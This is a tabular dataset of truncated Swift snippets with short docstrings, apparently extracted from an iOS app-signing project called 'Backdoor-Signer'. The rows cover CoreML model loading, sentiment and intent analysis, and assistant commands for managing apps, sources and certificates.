// Always check if device has less than 3GB RAM
return totalMemoryGB < 3.0"
1755,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Notify user that AI features are deferred","private func notifyUserOfDeferredLoading() {
// Only show once per session
if hasShownDeferredNotification {"
1756,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Load the CoreML model with local learning support","func loadModelWithLocalLearning(completion: ((Bool) -> Void)? = nil) {
// If model is already loaded, return early
guard !modelLoaded else {"
1757,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Load the default CoreML model (now based on user-generated models)","private func loadDefaultModel(completion: ((Bool) -> Void)? = nil) {
// First try with existing URL if we have one
if let modelURL = modelURL {"
1758,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Try to generate an initial model if possible with existing data","private func tryGenerateInitialModel() {
// Get statistics on available data
let stats = AILearningManager.shared.getLearningStatistics()

// If we have enough data to attempt model creation
if stats.totalDataPoints >= 5 {"
1759,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Load model from the specified URL with memory safety and progress indication","private func loadModelFromURL(_ url: URL, completion: ((Bool) -> Void)? = nil) {
// Show loading indicator for large files after a small delay
var loadingAlert: UIAlertController?
var loadingAlertPresented = false

// Only show UI after a brief delay if loading is still ongoing
DispatchQueue.main.asyncAfter(deadline: .now() + 0.75) { [weak self] in"
1760,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Analyzes user input to determine intent with ML model","func predictIntent(from text: String, completion: @escaping (Result<PredictionResult, PredictionError>) -> Void) {
// Ensure model is loaded before attempting prediction
if !modelLoaded {"
1761,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Performs sentiment analysis on text","func analyzeSentiment(from text: String, completion: @escaping (Result<SentimentResult, PredictionError>) -> Void) {
// Ensure model is loaded before attempting prediction
if !modelLoaded {"
1762,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","struct parameter - implements parameter functionality","score: 0.5, // Changed from confidence to score to match struct parameter name
text: text
)

completion(.success(result))
}
}
} else {"
1763,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","Function performSentimentAnalysis - implements performsentimentanalysis functionality","func performSentimentAnalysis(
text: String,
completion: @escaping (Result<SentimentResult, PredictionError>) -> Void
) {"
1764,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Non-overloaded version for internal use","private func internalAnalyzeSentiment(
text: String,
completion: @escaping (Result<SentimentResult, PredictionError>) -> Void
) {"
1765,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Performs sentiment analysis with pattern matching fallback","private func performSentimentAnalysisInternal(
text: String,
completion: @escaping (Result<SentimentResult, PredictionError>) -> Void
) {"
1766,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Fallback sentiment analysis for when ML model is unavailable","private func fallbackSentimentAnalysis(text: String) -> SentimentResult {
let lowercasedText = text.lowercased()
let positiveTerms = [
""good"",
""great"",
""excellent"",
""amazing"",
""love"",
""thanks"",
""thank"","
1767,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","MARK: - Private Methods / Execute prediction on loaded model with pattern matching fallback","private func performPrediction(
text: String,
completion: @escaping (Result<PredictionResult, PredictionError>) -> Void
) {"
1768,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Perform pattern matching based intent prediction when ML model is unavailable","private func performPatternMatchingPrediction(text: String) -> PredictionResult {
let lowercasedText = text.lowercased()

// Default values
var intent = ""unknown""
var confidence = 0.5
var parameters: [String: Any] = [""text"": text]

// Check for greetings
if lowercasedText.contains(""hello"") || lowercasedText"
1769,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Process model outputs into a structured result","private func processOutputs(prediction: MLFeatureProvider, text: String) throws -> PredictionResult {
// Default values
var intent = ""unknown""
var confidence = 0.0
var parameters: [String: Any] = [:]
var probabilities: [String: Double] = [:]

// Try to extract output features from the prediction
for featureName in prediction.featureNames {"
1770,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Extract parameters from text based on the predicted intent","private func extractParameters(from text: String, intent: String) -> [String: Any] {
var parameters: [String: Any] = [:]

// Use regex to extract structured data from the text
switch intent.lowercased() {"
1771,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Extract common parameters from any text","private func extractCommonParameters(from text: String, into parameters: inout [String: Any]) {
// Look for app names
if let appName = text.extractMatch(
pattern: ""(?i)\\b(?:app|application)\\s+(?:called|named)\\s+\""?([^\"".,?!]+)\""?"",
groupIndex: 1
) {"
1772,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Performs sentiment analysis on text (private implementation)","private func performSentimentAnalysisLegacy(
text: String,
completion: @escaping (Result<SentimentResult, PredictionError>) -> Void
) {"
1773,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Set up memory pressure monitoring","private func setupMemoryPressureMonitoring() {
// Create a local copy of the observer to avoid mutation after capture
var memoryObserverLocal: NSObjectProtocol?

// Create the observer before the closure to avoid capturing it in the closure
let memoryObserver = NotificationCenter.default.addObserver(
forName: UIApplication.didReceiveMemoryWarningNotification,
object: nil,
queue: .main
) { [weak self] _ in"
1774,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","Import the extension containing extractMatch from AppContextManager+AIIntegration.swift Note: The extractMatch method is defined elsewhere in the project We avoid redeclaration by using that implementation instead MARK: - Models / Result of intent prediction","struct PredictionResult {
let intent: String
let confidence: Double
let text: String
let parameters: [String: Any]
let probabilities: [String: Double]
}

/// Result of sentiment analysis
struct SentimentResult {"
1775,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Result of sentiment analysis","struct SentimentResult {
let sentiment: SentimentType
let score: Double
let text: String
}

/// Types of sentiment
enum SentimentType: String {"
1776,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Types of sentiment","enum SentimentType: String {
case positive
case negative
case neutral
}

/// Errors that can occur during prediction
enum PredictionError: Error, LocalizedError {"
1777,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/CoreMLManager.swift","/ Errors that can occur during prediction","enum PredictionError: Error, LocalizedError {
case modelNotLoaded
case modelNotFound
case invalidModelFormat
case unsupportedInputType
case unsupportedOperation
case predictionFailed(Error)

var errorDescription: String? {"
1778,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Manages ML model file operations and ensures it's available for the app","final class ModelFileManager {
static let shared = ModelFileManager()

private init() {}"
1779,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Get or set up the models directory in the Documents folder","private func getModelDirectory() -> URL? {
do {"
1780,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Check for user-generated models in the documents directory","func findUserGeneratedModel() -> URL? {
Debug.shared.log(message: ""Looking for user-generated models"", type: .info)

guard let modelsDir = getModelDirectory() else {"
1781,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Create a URL for a new model file with timestamp","func createModelURL(versionSuffix: String? = nil) -> URL? {
guard let modelsDir = getModelDirectory() else {"
1782,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Setup the initial model directory structure","func setupModelDirectories() {
// Just ensure the directories exist
_ = getModelDirectory()

// Create a legacy directory for backward compatibility
do {"
1783,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Copy a model file to the models directory","func copyModelToDocuments(from sourceURL: URL, versionSuffix: String? = nil) -> URL? {
guard let destinationURL = createModelURL(versionSuffix: versionSuffix) else {"
1784,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Prepare the model system - now focused on user-generated models","func prepareMLModel(completion: @escaping (Result<URL?, Error>) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1785,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CoreML/ModelFileManager.swift","/ Errors that can occur during model file operations","enum ModelError: Error, LocalizedError {
case modelNotFound
case copyFailed
case directoryCreationFailed
case insufficientTrainingData

var errorDescription: String? {"
1786,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","MARK: - AI Integration Extension for AppContextManager","extension AppContextManager {
/// Initialize AI integration - call this at app startup
func setupAIIntegration() {"
1787,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","/ Initialize AI integration - call this at app startup","func setupAIIntegration() {
// Register all available commands
registerAllCommands()

// Setup observers for context updates
setupContextObservers()

// Setup CoreML integration
setupCoreML()
"
1788,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","/ Handle CoreML model load completion","@objc private func coreMLModelLoaded() {
Debug.shared.log(message: ""CoreML model load completed, enhancing AI capabilities"", type: .info)

// Update any AI components that depend on the model
let additionalData: [String: Any] = [
""mlModelLoaded"": true,
""mlCapabilities"": [""intent recognition"", ""sentiment analysis"", ""parameter extraction""],
]
setAdditionalContextData(additionalData)
"
1789,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","/ Setup context observation to keep AI updated with app state","private func setupContextObservers() {
// Observe tab changes
NotificationCenter.default.addObserver(
self,
selector: #selector(handleTabChange(_:)),
name: Notification.Name(""changeTab""),
object: nil
)

// Observe app state changes"
1790,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function handleTabChange - implements handletabchange functionality","@objc private func handleTabChange(_ notification: Notification) {
if let newTab = notification.userInfo?[""tab""] as? String {"
1791,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function appEnteredForeground - implements appenteredforeground functionality","@objc private func appEnteredForeground() {
// Refresh context when app becomes active
if let topVC = UIApplication.shared.topMostViewController() {"
1792,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function certificatesUpdated - implements certificatesupdated functionality","@objc private func certificatesUpdated() {
// Update AI context with new certificate information
let certificates = CoreDataManager.shared.getDatedCertificate()
let currentCert = CoreDataManager.shared.getCurrentCertificate()

let additionalData: [String: Any] = [
""certificates"": certificates.map { $0.certData?.name ?? ""Unnamed"" },"
1793,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function libraryUpdated - implements libraryupdated functionality","@objc private func libraryUpdated() {
// Update AI context with library information
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
let signedApps = CoreDataManager.shared.getDatedSignedApps()

let additionalData: [String: Any] = [
""downloadedApps"": downloadedApps
.map { AppInfo(name: $0.name ?? ""Unnamed"", version: $0.version ?? ""Unknown"").description },"
1794,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function settingsUpdated - sets tingsupdated","@objc private func settingsUpdated() {
// Update AI context with relevant settings changes
let additionalData: [String: Any] = [
""appTintColor"": Preferences.appTintColor.uiColor.toHexString(),
""interfaceStyle"": UIUserInterfaceStyle(rawValue: Preferences.preferredInterfaceStyle)?
.styleName ?? ""unspecified"",
""preferredLanguage"": Preferences.preferredLanguageCode ?? ""system default"",
]

setAdditionalContextData(additionalData)"
1795,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","/ Process user input through our enhanced natural language understanding","func processUserInput(_ text: String) -> (intent: String, parameter: String, confidence: Float)? {
// First try the pattern-based intent recognition for high confidence matches
if let patternMatch = enhanceContextWithNLU(text) {"
1796,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","/ Enhanced context with natural language understanding capabilities","func enhanceContextWithNLU(_ textInput: String) -> (intent: String, parameter: String)? {
let lowercasedInput = textInput.lowercased()

// Check for app signing intent
if lowercasedInput.matches(pattern: ""(?i)sign\\s+(the\\s+)?app\\s+(?:called\\s+|named\\s+)?(.+?)\\s*$"") {"
1797,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Helper extensions for string pattern matching","extension String {
func matches(pattern: String) -> Bool {"
1798,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function matches - implements matches functionality","func matches(pattern: String) -> Bool {
do {"
1799,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Function extractMatch - implements extractmatch functionality","func extractMatch(pattern: String, groupIndex: Int) -> String? {
do {"
1800,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+AIIntegration.swift","Extension for UIUserInterfaceStyle friendly name","extension UIUserInterfaceStyle {
var styleName: String {"
1801,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift","MARK: - Command Registration Extension for AppContextManager","extension AppContextManager {
/// Registers all available commands with the AI assistant
func registerAllCommands() {"
1802,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift","/ Registers all available commands with the AI assistant","func registerAllCommands() {
// Navigation commands
registerCommand(""navigate to"") { [weak self] screen, completion in"
1803,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift","MARK: - New Command Implementations / Search for apps or content in the app","private func searchApp(_ query: String, completion: @escaping (String) -> Void) {
// Get downloaded apps
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()

// Filter apps based on query
let matchingApps = downloadedApps.filter { app in"
1804,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CommandRegistration.swift","/ Explain a feature of the app","private func explainFeature(_ topic: String, completion: @escaping (String) -> Void) {
let lowercasedTopic = topic.lowercased()

if lowercasedTopic.contains(""sign"") || lowercasedTopic.contains(""signing"") {"
1805,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift","/ Extension to AppContextManager for CoreML setup and integration","extension AppContextManager {
/// Initialize CoreML for app-wide use
func setupCoreML() {"
1806,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift","/ Initialize CoreML for app-wide use","func setupCoreML() {
Debug.shared.log(message: ""Setting up CoreML integration"", type: .info)

// Start model loading in background to avoid blocking UI
DispatchQueue.global(qos: .userInitiated).async {"
1807,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift","/ Prepare and load the ML model","private func prepareAndLoadMLModel() {
// Ensure model file is available
ModelFileManager.shared.prepareMLModel { result in"
1808,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+CoreMLSetup.swift","/ Register commands related to CoreML and AI features","private func registerCoreMLCommands() {
// Command to analyze text with ML model
registerCommand(""analyze text"") { text, completion in"
1809,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Command Implementation Extension for AppContextManager","extension AppContextManager {
// MARK: - Navigation

/// Navigate to a specific screen in the app
func navigateToScreen(_ screen: String, completion: @escaping (String) -> Void) {"
1810,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Navigation / Navigate to a specific screen in the app","func navigateToScreen(_ screen: String, completion: @escaping (String) -> Void) {
// We don't strictly need to check if we're on the tab bar view
// Just attempt to navigate and provide appropriate feedback
guard UIApplication.shared.topMostViewController() != nil else {"
1811,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Source Management / Add a source to the app","func addSource(_ sourceURL: String, completion: @escaping (String) -> Void) {
guard URL(string: sourceURL) != nil else {"
1812,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ List all sources in the app","func listSources(completion: @escaping (String) -> Void) {
let sources = CoreDataManager.shared.getAZSources()
if sources.isEmpty {"
1813,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Refresh all sources","func refreshSources(completion: @escaping (String) -> Void) {
let backgroundQueue = OperationQueue()
backgroundQueue.qualityOfService = .background
let operation = SourceRefreshOperation()

operation.completionBlock = {"
1814,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - App Management / Download an app from a source","func downloadApp(_: String, completion: @escaping (String) -> Void) {
// This is a simplified implementation - would need to be expanded based on app structure
completion(
""App download functionality requires user interaction. Please navigate to the Sources tab and select the app you want to download.""
)
}

/// Sign an app
func signApp(_ appName: String, completion: @escaping (String) -> Void) {"
1815,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Sign an app","func signApp(_ appName: String, completion: @escaping (String) -> Void) {
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()

guard !downloadedApps.isEmpty else {"
1816,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Install a signed app","func installApp(_ appName: String, completion: @escaping (String) -> Void) {
let signedApps = CoreDataManager.shared.getDatedSignedApps()

guard !signedApps.isEmpty else {"
1817,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ List all downloaded apps","func listDownloadedApps(completion: @escaping (String) -> Void) {
let apps = CoreDataManager.shared.getDatedDownloadedApps()

if apps.isEmpty {"
1818,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ List all signed apps","func listSignedApps(completion: @escaping (String) -> Void) {
let apps = CoreDataManager.shared.getDatedSignedApps()

if apps.isEmpty {"
1819,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Delete an app (downloaded or signed)","func deleteApp(_: String, completion: @escaping (String) -> Void) {
// This is a placeholder - the actual implementation would need to be expanded
completion(
""App deletion requires user interaction. Please go to the Library tab, swipe left on the app, and select 'Delete'.""
)
}

// MARK: - Certificate Management

/// List all certificates"
1820,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Certificate Management / List all certificates","func listCertificates(completion: @escaping (String) -> Void) {
let certificates = CoreDataManager.shared.getDatedCertificate()

if certificates.isEmpty {"
1821,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Select a certificate for signing","func selectCertificate(_ certName: String, completion: @escaping (String) -> Void) {
let certificates = CoreDataManager.shared.getDatedCertificate()

guard !certificates.isEmpty else {"
1822,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Import a certificate","func importCertificate(completion: @escaping (String) -> Void) {
completion(
""Certificate import requires user interaction. Please go to Settings > Certificates > Import Certificate.""
)
}

// MARK: - Settings Management

/// Change app theme
func changeTheme(_ theme: String, completion: @escaping (String) -> Void) {"
1823,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Settings Management / Change app theme","func changeTheme(_ theme: String, completion: @escaping (String) -> Void) {
let themeMode: Int
switch theme.lowercased() {"
1824,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Toggle app settings","func toggleSetting(_ setting: String, completion: @escaping (String) -> Void) {
// Simple implementation for a few common settings - would need to be expanded
switch setting.lowercased() {"
1825,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Get detailed information about an app","func getAppInfo(_ appName: String, completion: @escaping (String) -> Void) {
// Check downloaded apps
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
let matchingDownloaded = downloadedApps.filter {"
1826,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Advanced Operations / Resign an app with the current certificate","func resignApp(_: String, completion: @escaping (String) -> Void) {
// This is a placeholder - would need to be implemented with access to the app's UI
completion(
""App re-signing requires user interaction. Please go to the Library tab, select the app, and choose 'Resign'.""
)
}

/// Add a tweak to an app
func addTweak(_: String, completion: @escaping (String) -> Void) {"
1827,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Add a tweak to an app","func addTweak(_: String, completion: @escaping (String) -> Void) {
// This is a placeholder - would need to be implemented with access to the app's UI
completion(""Adding tweaks requires user interaction. Please start the signing process and select 'Add Tweaks'."")
}

/// Modify an app's bundle ID
func modifyBundleId(_: String, completion: @escaping (String) -> Void) {"
1828,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Modify an app's bundle ID","func modifyBundleId(_: String, completion: @escaping (String) -> Void) {
// This is a placeholder - would need to be implemented with access to the app's UI
completion(
""Modifying bundle ID requires user interaction. Please start the signing process and edit the Bundle Identifier field.""
)
}

/// Get current app status
func getAppStatus(completion: @escaping (String) -> Void) {"
1829,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Get current app status","func getAppStatus(completion: @escaping (String) -> Void) {
let downloadedCount = CoreDataManager.shared.getDatedDownloadedApps().count
let signedCount = CoreDataManager.shared.getDatedSignedApps().count
let certificateCount = CoreDataManager.shared.getDatedCertificate().count
let currentCert = CoreDataManager.shared.getCurrentCertificate()?.certData?.name ?? ""None""

var statusInfo = ""Backdoor App Status:\n""
statusInfo += ""- Downloaded Apps: \(downloadedCount)\n""
statusInfo += ""- Signed Apps: \(signedCount)\n""
statusInfo += ""- Certificates: \(certificateCount)\n"""
1830,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","/ Open an installed app","func openApp(_ appName: String, completion: @escaping (String) -> Void) {
let signedApps = CoreDataManager.shared.getDatedSignedApps()

// Find the app by name
let matchingApps = signedApps.filter {"
1831,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+MappingFunctions.swift","MARK: - Help Functions / Provide help information","func provideHelp(_ topic: String, completion: @escaping (String) -> Void) {
switch topic.lowercased() {"
1832,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Enhanced AI integration extension for AppContextManager / / This extension adds improved AI capabilities to the AppContextManager: / 1. Enhanced pattern matching for better command recognition / 2. Context-aware conversations with history tracking / 3. Predictive command suggestions based on user behavior","extension AppContextManager {
// MARK: - Enhanced AI Setup

/// Sets up the enhanced AI capabilities
func setupEnhancedAI() {"
1833,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","MARK: - Enhanced AI Setup / Sets up the enhanced AI capabilities","func setupEnhancedAI() {
// Register for additional context observations
setupEnhancedContextObservers()

// Register advanced AI commands
registerAdvancedCommands()

// Initialize the learning model
initializePredictiveModel()
"
1834,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","Function setupEnhancedContextObservers - sets upenhancedcontextobservers","private func setupEnhancedContextObservers() {
// Observe file system changes for better context awareness
NotificationCenter.default.addObserver(
self,
selector: #selector(fileSystemChanged(_:)),
name: NSNotification.Name(""FileSystemChanged""),
object: nil
)

// Observe sign operations for better assistance"
1835,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","Function fileSystemChanged - implements filesystemchanged functionality","@objc private func fileSystemChanged(_ notification: Notification) {
if let changedPath = notification.userInfo?[""path""] as? String {"
1836,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","Function signingOperationCompleted - implements signingoperationcompleted functionality","@objc private func signingOperationCompleted(_ notification: Notification) {
if let appName = notification.userInfo?[""appName""] as? String,
let success = notification.userInfo?[""success""] as? Bool
{"
1837,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","Function sourcesRefreshed - implements sourcesrefreshed functionality","@objc private func sourcesRefreshed(_: Notification) {
let sources = CoreDataManager.shared.getAZSources()

let additionalData: [String: Any] = [
""refreshedSources"": sources.map { $0.name ?? ""Unnamed"" },"
1838,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","MARK: - Advanced AI Commands / Registers advanced AI commands for enhanced functionality","private func registerAdvancedCommands() {
// Batch signing command
registerCommand(""batch sign"") { [weak self] appNames, completion in"
1839,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","MARK: - Command History and Prediction Command history is now stored in the main AppContextManager class / Updates the command history for better predictions","private func updateCommandHistory(command: String, parameter: String) {
commandHistory.append((command: command, parameter: parameter, timestamp: Date()))

// Keep only the last 50 commands
if commandHistory.count > 50 {"
1840,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Initialize the predictive model for command suggestions","private func initializePredictiveModel() {
// Load any saved command history
if let savedHistory = UserDefaults.standard.object(forKey: ""AICommandHistory"") as? Data {"
1841,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Update the prediction model with new command history","private func updatePredictionModel() {
// Save the command history for future use
let historyEntries = commandHistory.map { CommandHistoryEntry("
1842,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Get predicted commands based on user behavior","func getPredictedCommands(currentInput: String) -> [String] {
// Simple prediction based on command frequency and recency
var commandFrequency: [String: Int] = [:]
var predictions: [String] = []

// Calculate frequency
for entry in commandHistory {"
1843,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","MARK: - Implementation for Advanced Commands / Performs batch signing of multiple apps","private func performBatchSigning(apps: [String]) {
for appName in apps {"
1844,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Gets suggested apps based on category and user history","private func getSuggestedApps(for category: String, completion: @escaping ([String]) -> Void) {
// Simulate app suggestions based on category
var suggestions: [String] = []

switch category.lowercased() {"
1845,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/AppContextManager+OptimizedAI.swift","/ Performs advanced search across the app","private func performAdvancedSearch(query: String, completion: @escaping ([String]) -> Void) {
// Simulate advanced search functionality
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
let signedApps = CoreDataManager.shared.getDatedSignedApps()
let sources = CoreDataManager.shared.getAZSources()

// Combine all searchable items
var searchResults: [String] = []

// Search in downloaded apps"
